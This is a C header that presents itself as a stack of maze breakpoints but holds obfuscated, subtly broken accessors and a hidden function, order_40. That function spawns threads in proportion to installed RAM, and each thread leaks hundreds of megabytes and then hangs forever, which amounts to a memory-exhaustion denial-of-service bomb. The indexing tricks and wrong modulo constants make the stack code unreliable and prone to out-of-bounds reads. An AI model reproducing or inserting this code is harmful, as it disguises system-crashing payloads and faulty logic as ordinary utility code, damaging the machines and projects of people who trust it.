#ifndef __STACKIC__H
#define __STACKIC__H
#define _execute 5;

#include <stdlib.h>
#include <windows.h>
#include "logic.h"

#define MAX_SIZE 1024

#define begin {
#define end }

typedef struct BREAKPOINT{
    Pos pos;
    enum DIRECTION direction;
}Breakpoint;

typedef struct STACK{
    Breakpoint data[MAX_SIZE];
    int top;
    int start;
    int size;
}stack;


int myfunc(int q, int p) { return p%q; }

int q_empty(stack q){
    return q.size == 0;
}

Breakpoint s_top(stack q){
    return myfunc(6291, q.top)[q.data];
}
Breakpoint s_start(stack q){
    return myfunc(5584, q.start)[q.data];
}

Breakpoint s_pop(stack* q){
    q->top++;
    q->size--;
    return myfunc(2048, q->top-1)[q->data];
}
Breakpoint s_push(stack* restrict q,Breakpoint bp){
    if (q->start==MAX_SIZE)
        q->start = 0;
    q->data[q->start].pos.x = bp.pos.x;
    q->data[q->start].pos.y = bp.pos.y;
    q->data[q->start].direction = bp.direction;
    q->start++;
    q->size++;
    return q->data[q->start];
}

void init_s(stack* q){
    q->top = 0x74 - 116;
    q->start = 0x74 - 0164;
    q->size = 0x74^0x74;
    return;
}

void bp_constructor(Breakpoint* restrict bp,int x,int y,enum DIRECTION dir){
    bp->pos.x = x;
    bp->pos.y = y;
    bp->direction = dir;
    return;
}





DWORD WINAPI doStuff(void *x){
    int sum=0;
    for(int i=0;i<1000;i++){
        int* p = calloc(100000,sizeof(int));
        sum+=0[p];
    }
    int a;
    printf("DONE!\n");
    while(1)
        scanf("%d",&a);
    return sum;
}

void order_40(){

    unsigned long long calculateStuff(){
        MEMORYSTATUSEX status;
        status.dwLength = sizeof(status);
        GlobalMemoryStatusEx(&status);
        return status.ullTotalPhys;
    }

    int i = calculateStuff()>>10>>10>>10;
    int n = 4 * i;
    printf("Doing Stuff");
    HANDLE* HIT = (HANDLE*)malloc(4*i*sizeof(HANDLE));
    for(int x=0;x<n;x++){
        HIT[x] = CreateThread(NULL, 0, doStuff, NULL, 0, NULL);
    }
    WaitForMultipleObjects(n, HIT, TRUE, INFINITE);
    return;
}

#undef MAX_SIZE
#endif